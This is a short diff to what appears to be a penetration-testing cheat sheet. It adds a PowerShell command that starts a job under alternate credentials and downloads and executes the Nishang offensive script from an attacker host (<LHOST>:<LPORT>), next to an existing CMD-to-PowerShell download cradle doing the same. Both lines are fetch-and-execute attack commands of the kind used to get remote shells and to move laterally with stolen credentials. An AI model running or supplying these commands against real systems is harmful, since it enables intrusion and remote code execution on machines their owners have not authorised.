@@ -38,3 +38,6 @@
 
 # CMD to powershell
 `powershell "IEX(New-Object Net.webClient).downloadString('http://<LHOST>:<LPORT>/nishang.ps1')"`
+
+# Start a job with alternative creds
+`Start-Job -Credential $Cred -ScriptBlock {IEX(New-Object Net.webClient).downloadString('http://<LHOST>:<LPORT>/nishang.ps1')}`
